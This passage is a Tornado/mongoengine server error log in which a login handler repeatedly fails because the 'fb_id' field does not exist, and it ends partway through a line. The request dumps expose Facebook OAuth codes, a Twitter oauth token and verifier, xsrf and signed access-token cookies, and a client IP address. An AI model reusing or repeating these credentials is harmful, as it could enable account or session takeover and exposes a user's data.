  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 564, in _collection
    self._ensure_indexes()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 476, in _ensure_indexes
    if index_types and '_types' in self._query and not types_indexed:
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQD8t6ZMuNwKUU710XqKlhjNCEhAK06YrO3u4LwUYZWp6pmMOsyDBQQjdx654XSvfIU7rWJybY5H8mum_6heqjXgfl2-CBlkmkL4jIPVKL17qZTICQLSIRyweWkJKG9Y6B4i-1D234hw5Du4ih48L8cwZ7gJ2aD9tD2IkJ-DQ9l2cJYh82ntWs1Vcqlvu1ut80rZVqFACyxemICIpyzmXpDi (127.0.0.1) 904.42ms
ERROR:root:Uncaught exception GET /login?code=AQC1zCX_xvx3g7-vmWaQ_LBgoYcAutXKQ9BogFe-SpbWIaZGhVRtspTFiR1d0dx5J1sIH9VLMsEQ2RbQ_CkhMC8bXkl1SbRzEivchQ4UOyigg5dL5AgRuvLlpo-cOBfN4J5aTehXBh31TKmn85Y5H0cJTBxUZ1Wxs9rP2n8eVjKA3f5wUbA8SwKZQrrAczi5TzLiHDBjfZhwBTjrOSHQdQ7X (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQC1zCX_xvx3g7-vmWaQ_LBgoYcAutXKQ9BogFe-SpbWIaZGhVRtspTFiR1d0dx5J1sIH9VLMsEQ2RbQ_CkhMC8bXkl1SbRzEivchQ4UOyigg5dL5AgRuvLlpo-cOBfN4J5aTehXBh31TKmn85Y5H0cJTBxUZ1Wxs9rP2n8eVjKA3f5wUbA8SwKZQrrAczi5TzLiHDBjfZhwBTjrOSHQdQ7X', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.4.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQC1zCX_xvx3g7-vmWaQ_LBgoYcAutXKQ9BogFe-SpbWIaZGhVRtspTFiR1d0dx5J1sIH9VLMsEQ2RbQ_CkhMC8bXkl1SbRzEivchQ4UOyigg5dL5AgRuvLlpo-cOBfN4J5aTehXBh31TKmn85Y5H0cJTBxUZ1Wxs9rP2n8eVjKA3f5wUbA8SwKZQrrAczi5TzLiHDBjfZhwBTjrOSHQdQ7X (127.0.0.1) 886.14ms
ERROR:root:Uncaught exception GET /login?code=AQC1zCX_xvx3g7-vmWaQ_LBgoYcAutXKQ9BogFe-SpbWIaZGhVRtspTFiR1d0dx5J1sIH9VLMsEQ2RbQ_CkhMC8bXkl1SbRzEivchQ4UOyigg5dL5AgRuvLlpo-cOBfN4J5aTehXBh31TKmn85Y5H0cJTBxUZ1Wxs9rP2n8eVjKA3f5wUbA8SwKZQrrAczi5TzLiHDBjfZhwBTjrOSHQdQ7X (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQC1zCX_xvx3g7-vmWaQ_LBgoYcAutXKQ9BogFe-SpbWIaZGhVRtspTFiR1d0dx5J1sIH9VLMsEQ2RbQ_CkhMC8bXkl1SbRzEivchQ4UOyigg5dL5AgRuvLlpo-cOBfN4J5aTehXBh31TKmn85Y5H0cJTBxUZ1Wxs9rP2n8eVjKA3f5wUbA8SwKZQrrAczi5TzLiHDBjfZhwBTjrOSHQdQ7X', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.4.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQC1zCX_xvx3g7-vmWaQ_LBgoYcAutXKQ9BogFe-SpbWIaZGhVRtspTFiR1d0dx5J1sIH9VLMsEQ2RbQ_CkhMC8bXkl1SbRzEivchQ4UOyigg5dL5AgRuvLlpo-cOBfN4J5aTehXBh31TKmn85Y5H0cJTBxUZ1Wxs9rP2n8eVjKA3f5wUbA8SwKZQrrAczi5TzLiHDBjfZhwBTjrOSHQdQ7X (127.0.0.1) 927.55ms
ERROR:root:Uncaught exception GET /login?code=AQCL7xDJ6snRyhXgbYsUrnWW2T5GxSCvKBFNlJJWY77y6Y3ZGFXlnHrthcBlXeBsXHFIK0EVG6oRb5GDn8tTKY405c6ir4Q60m53ak1TUydFZpiZ8w6MHsxghbKqHafceKSvnJ2XOLuyaeBZxqR5y4ER2cOhxiMwgV8Dj97RqZ3fYU8BfaioColM-Cbyj0olysb4-dLlJOrj9WtloxbWxaAf (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQCL7xDJ6snRyhXgbYsUrnWW2T5GxSCvKBFNlJJWY77y6Y3ZGFXlnHrthcBlXeBsXHFIK0EVG6oRb5GDn8tTKY405c6ir4Q60m53ak1TUydFZpiZ8w6MHsxghbKqHafceKSvnJ2XOLuyaeBZxqR5y4ER2cOhxiMwgV8Dj97RqZ3fYU8BfaioColM-Cbyj0olysb4-dLlJOrj9WtloxbWxaAf', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://www.intheory.co.uk/', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.6.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 564, in _collection
    self._ensure_indexes()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 476, in _ensure_indexes
    if index_types and '_types' in self._query and not types_indexed:
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQCL7xDJ6snRyhXgbYsUrnWW2T5GxSCvKBFNlJJWY77y6Y3ZGFXlnHrthcBlXeBsXHFIK0EVG6oRb5GDn8tTKY405c6ir4Q60m53ak1TUydFZpiZ8w6MHsxghbKqHafceKSvnJ2XOLuyaeBZxqR5y4ER2cOhxiMwgV8Dj97RqZ3fYU8BfaioColM-Cbyj0olysb4-dLlJOrj9WtloxbWxaAf (127.0.0.1) 916.82ms
WARNING:root:Missing OAuth request token cookie
WARNING:root:500 GET /login/twitter?oauth_token=NQdX2MpRKihTgrrqqT8rS3xBigrTuCoY2qzvNgqL1bY&oauth_verifier=dzoTYwxBLe2H59UmsD0guJPMzbxaytKLEK4K0M1mY7I (127.0.0.1): Twitter auth failed
ERROR:root:500 GET /login/twitter?oauth_token=NQdX2MpRKihTgrrqqT8rS3xBigrTuCoY2qzvNgqL1bY&oauth_verifier=dzoTYwxBLe2H59UmsD0guJPMzbxaytKLEK4K0M1mY7I (127.0.0.1) 4.87ms
ERROR:root:Uncaught exception GET /login?code=AQAqVatDPQ-cOq8kr1koArKwnQmLpSa1CJnP6AN3p2CxMe4fDnxOf7CBq6CA1zpSE_Q-Cx3Q3B3Q9d4L7c4qljrKJmL4ZBwOGhpsr3jN3ahw83QH6vUPbCCNkxTlZuZevW81diPFw_VkDW3KaLfggCrjdlrySKKER89tyH8PSomCv0jEh5ksXZdvk9nZRWO6nYoGsaP5Sbh866Kr8T9B2QrO (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQAqVatDPQ-cOq8kr1koArKwnQmLpSa1CJnP6AN3p2CxMe4fDnxOf7CBq6CA1zpSE_Q-Cx3Q3B3Q9d4L7c4qljrKJmL4ZBwOGhpsr3jN3ahw83QH6vUPbCCNkxTlZuZevW81diPFw_VkDW3KaLfggCrjdlrySKKER89tyH8PSomCv0jEh5ksXZdvk9nZRWO6nYoGsaP5Sbh866Kr8T9B2QrO', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Referer': 'http://www.intheory.co.uk/', 'X-Real-Ip': '109.158.140.86', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; user_type="dHdpdHRlcg==|1348568822|901927d765ad63afc295a1d5748eefe2be18b758"; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.29.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQAqVatDPQ-cOq8kr1koArKwnQmLpSa1CJnP6AN3p2CxMe4fDnxOf7CBq6CA1zpSE_Q-Cx3Q3B3Q9d4L7c4qljrKJmL4ZBwOGhpsr3jN3ahw83QH6vUPbCCNkxTlZuZevW81diPFw_VkDW3KaLfggCrjdlrySKKER89tyH8PSomCv0jEh5ksXZdvk9nZRWO6nYoGsaP5Sbh866Kr8T9B2QrO (127.0.0.1) 869.12ms
ERROR:root:Uncaught exception GET /login?code=AQDVVzknVLErnzJ0EK2T8z2nzhRGnMb9M--H0_lq-If-hTJUSwFknd4jgXTwSOsXMCwRyEqRWKRyIc0FWQVmGGfWeiBFtktdUJr44xg1H8kLxz3RsC6c6VYbrI1ZYMGKXn-qZmSFbF9TbU9omu44e3TJCL3i5phZ2FyfKXkdr65a-Hiw03tiBbKnjbINoIkNieD52MMw9j-pPcyJeScUJaIQ (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQDVVzknVLErnzJ0EK2T8z2nzhRGnMb9M--H0_lq-If-hTJUSwFknd4jgXTwSOsXMCwRyEqRWKRyIc0FWQVmGGfWeiBFtktdUJr44xg1H8kLxz3RsC6c6VYbrI1ZYMGKXn-qZmSFbF9TbU9omu44e3TJCL3i5phZ2FyfKXkdr65a-Hiw03tiBbKnjbINoIkNieD52MMw9j-pPcyJeScUJaIQ', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; access_token="Y2xjV1pnMU5YTm1ucGNxYzVuU3VWUEJoMEtnWUtVTVNpWlB6VWJGVUFSUQ==|1348569281|8811424734eaab51f4c0420b43190293d0641182"; user_type="dHdpdHRlcg==|1348569281|7ce83e6495219c2e8e4159d4fab41098579a4f6d"; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.32.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/', 'X-Real-Ip': '109.158.140.86'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 564, in _collection
    self._ensure_indexes()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 476, in _ensure_indexes
    if index_types and '_types' in self._query and not types_indexed:
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQDVVzknVLErnzJ0EK2T8z2nzhRGnMb9M--H0_lq-If-hTJUSwFknd4jgXTwSOsXMCwRyEqRWKRyIc0FWQVmGGfWeiBFtktdUJr44xg1H8kLxz3RsC6c6VYbrI1ZYMGKXn-qZmSFbF9TbU9omu44e3TJCL3i5phZ2FyfKXkdr65a-Hiw03tiBbKnjbINoIkNieD52MMw9j-pPcyJeScUJaIQ (127.0.0.1) 866.09ms
ERROR:root:Uncaught exception GET /login?code=AQDVVzknVLErnzJ0EK2T8z2nzhRGnMb9M--H0_lq-If-hTJUSwFknd4jgXTwSOsXMCwRyEqRWKRyIc0FWQVmGGfWeiBFtktdUJr44xg1H8kLxz3RsC6c6VYbrI1ZYMGKXn-qZmSFbF9TbU9omu44e3TJCL3i5phZ2FyfKXkdr65a-Hiw03tiBbKnjbINoIkNieD52MMw9j-pPcyJeScUJaIQ (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQDVVzknVLErnzJ0EK2T8z2nzhRGnMb9M--H0_lq-If-hTJUSwFknd4jgXTwSOsXMCwRyEqRWKRyIc0FWQVmGGfWeiBFtktdUJr44xg1H8kLxz3RsC6c6VYbrI1ZYMGKXn-qZmSFbF9TbU9omu44e3TJCL3i5phZ2FyfKXkdr65a-Hiw03tiBbKnjbINoIkNieD52MMw9j-pPcyJeScUJaIQ', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; access_token="Y2xjV1pnMU5YTm1ucGNxYzVuU3VWUEJoMEtnWUtVTVNpWlB6VWJGVUFSUQ==|1348569281|8811424734eaab51f4c0420b43190293d0641182"; user_type="dHdpdHRlcg==|1348569281|7ce83e6495219c2e8e4159d4fab41098579a4f6d"; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.32.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '109.158.140.86'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 796, in get
    self.limit(2)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 1101, in limit
    self._cursor.limit(n)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 583, in _cursor
    self._cursor_obj = self._collection.find(self._query,
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 379, in _query
    self._mongo_query = self._query_obj.to_query(self._document)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 205, in to_query
    query = query.accept(QueryCompilerVisitor(document))
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 270, in accept
    return visitor.visit_query(self)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 162, in visit_query
    return QuerySet._transform_query(self.document, **query.query)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 701, in _transform_query
    fields = QuerySet._lookup_field(_doc_cls, parts)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/queryset.py", line 639, in _lookup_field
    % field_name)
InvalidQueryError: Cannot resolve field "fb_id"
ERROR:root:500 GET /login?code=AQDVVzknVLErnzJ0EK2T8z2nzhRGnMb9M--H0_lq-If-hTJUSwFknd4jgXTwSOsXMCwRyEqRWKRyIc0FWQVmGGfWeiBFtktdUJr44xg1H8kLxz3RsC6c6VYbrI1ZYMGKXn-qZmSFbF9TbU9omu44e3TJCL3i5phZ2FyfKXkdr65a-Hiw03tiBbKnjbINoIkNieD52MMw9j-pPcyJeScUJaIQ (127.0.0.1) 858.99ms
ERROR:root:Uncaught exception GET /login?code=AQDVVzknVLErnzJ0EK2T8z2nzhRGnMb9M--H0_lq-If-hTJUSwFknd4jgXTwSOsXMCwRyEqRWKRyIc0FWQVmGGfWeiBFtktdUJr44xg1H8kLxz3RsC6c6VYbrI1ZYMGKXn-qZmSFbF9TbU9omu44e3TJCL3i5phZ2FyfKXkdr65a-Hiw03tiBbKnjbINoIkNieD52MMw9j-pPcyJeScUJaIQ (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQDVVzknVLErnzJ0EK2T8z2nzhRGnMb9M--H0_lq-If-hTJUSwFknd4jgXTwSOsXMCwRyEqRWKRyIc0FWQVmGGfWeiBFtktdUJr44xg1H8kLxz3RsC6c6VYbrI1ZYMGKXn-qZmSFbF9TbU9omu44e3TJCL3i5phZ2FyfKXkdr65a-Hiw03tiBbKnjbINoIkNieD52MMw9j-pPcyJeScUJaIQ', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=46d2eb7b0fa5434da61ae679b1f0ebac; access_token="Y2xjV1pnMU5YTm1ucGNxYzVuU3VWUEJoMEtnWUtVTVNpWlB6VWJGVUFSUQ==|1348569281|8811424734eaab51f4c0420b43190293d0641182"; user_type="dHdpdHRlcg==|1348569281|7ce83e6495219c2e8e4159d4fab41098579a4f6d"; __utma=188782963.1731359073.1348049186.1348501288.1348566979.7; __utmb=188782963.32.10.1348566979; __utmc=188782963; __utmz=188782963.1348501288.6.3.utmcsr=localhost:8888|utmccn=(referral)|utmcmd=referral|utmcct=/', 'Cache-Control': 